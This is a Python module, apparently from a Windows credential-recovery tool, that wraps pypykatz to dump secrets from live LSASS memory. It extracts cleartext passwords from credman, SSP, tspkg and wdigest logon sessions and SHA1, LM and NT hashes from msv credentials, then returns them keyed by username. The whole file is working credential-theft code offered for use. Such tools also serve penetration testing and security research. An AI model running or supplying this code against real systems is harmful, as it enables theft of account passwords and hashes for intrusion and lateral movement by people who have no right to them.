# -*- coding: utf-8 -*-

# Thanks to @skelsec for his awesome tool Pypykatz
# Checks his project here: https://github.com/skelsec/pypykatz

import codecs
import traceback

from winsecs.utils import log
from pypykatz.pypykatz import pypykatz


class Pypykatz:
    """
    Pypykatz dumps all secrets from the lsass.exe memory
    It does not work if:
    - LSASS is running as a protected process
    - A security product blocks this access
    """
    def run(self):
        mimi = None
        pwd_found = {}
        try:
            mimi = pypykatz.go_live()
        except Exception:
            log.debug(traceback.format_exc())

        if not mimi:
            return

        logon_sessions = mimi.to_dict().get('logon_sessions', [])
        for logon_session in logon_sessions:

            # Right now kerberos_creds, dpapi_creds results are not used
            user = logon_sessions[logon_session]

            # Get cleartext password
            for i in ['credman_creds', 'ssp_creds', 'livessp_creds', 'tspkg_creds', 'wdigest_creds']:
                for data in user.get(i, []):
                    if all((data['username'], data['password'])):
                        login = data['username']
                        if login not in pwd_found:
                            pwd_found[login] = {}

                        pwd_found[login]['Type'] = i
                        pwd_found[login]['Domain'] = data.get('domainname', 'N/A')
                        pwd_found[login]['Password'] = data['password']

            # msv_creds to get sha1 user hash
            for data in user.get('msv_creds', []):
                if data['username']:
                    login = data['username']
                else:
                    login = user['username']

                if login not in pwd_found:
                    pwd_found[login] = {}

                if data['SHAHash']:
                    pwd_found[login]['Shahash'] = codecs.encode(data['SHAHash'], 'hex')
                if data['LMHash']:
                    pwd_found[login]['Lmhash'] = codecs.encode(data['LMHash'], 'hex')
                if data['NThash']:
                    pwd_found[login]['Nthash'] = codecs.encode(data['NThash'], 'hex')

        return pwd_found


modules = {"Pypykatz": Pypykatz()}
